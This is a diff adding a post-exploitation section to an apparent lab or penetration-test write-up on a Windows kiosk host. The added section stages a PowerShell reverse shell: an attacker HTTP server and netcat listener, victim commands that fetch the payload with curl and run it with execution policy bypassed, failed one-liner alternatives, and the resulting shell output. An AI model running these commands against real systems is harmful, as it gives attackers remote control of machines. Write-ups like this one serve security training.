@@ -667,6 +667,48 @@ c367f826a4bf564b4a1f92bc0499a6b0
 <div style="page-break-after: always;"></div>
 
 ## 4. Post-Exploitation
+
+### 4.1 Upgrade to a PowerShell reverse shell (Privilege Escalation)
+
+**Why this step:** The browser-spawned `cmd.exe` (3.5) is cramped and error-prone for the many commands privesc requires. Stage a reverse shell so all further work runs from the attacker terminal. The target has no outbound internet but can reach the attacker over the VPN.
+
+**Action (attacker, Kali):**
+
+```
+# shell.ps1 contains a TCP reverse shell to 10.10.14.139:4444
+python3 -m http.server 8000      # serve the payload
+rlwrap nc -lvnp 4444             # listener (second terminal)
+```
+
+**Action (victim, in the kiosk cmd window):**
+
+```
+curl http://10.10.14.139:8000/shell.ps1 -o rev.ps1
+dir rev.ps1
+powershell -ep bypass -File rev.ps1
+```
+
+**Breakdown:**
+
+|Component|Meaning|
+|---|---|
+|`curl ... -o rev.ps1`|Download the reverse shell to disk with the built-in `curl.exe`. Saving to a file avoids fragile inline one-liners.|
+|`powershell -ep bypass -File rev.ps1`|Run the script from the file with execution policy bypassed, sidestepping IE-parsing and quoting issues seen with `iex (iwr ...)`.|
+
+**Dead ends recorded:** `iex (iwr -uri ...).Content` failed with "the Internet Explorer engine is not available" (IE DOM parsing); adding `-UseBasicParsing` made `.Content` return a `Byte[]` that could not convert to the `-Command` string; typed `IEX (New-Object Net.WebClient)...` one-liners were corrupted by the RDP console. Downloading to a file and running with `-File` avoids all three.
+
+**Result (attacker listener):**
+
+```
+listening on [any] 4444 ...
+connect to [10.10.14.139] from (UNKNOWN) [10.129.71.76] 60593
+PS C:\Users\KioskUser\Downloads> whoami
+kiosk-042\kioskuser
+```
+
+**What this gives you:** A stable interactive PowerShell session as `KIOSK-042\KioskUser` on the attacker terminal. **Key finding:** staging payloads to disk and executing with `-File` is the reliable transfer method on this host, given the broken clipboard and the absent IE engine.
+
+**Next:** Enumerate privileges, services, and file permissions to find a path from KioskUser to SYSTEM.
 <div align="center">
 <br>
 <br>
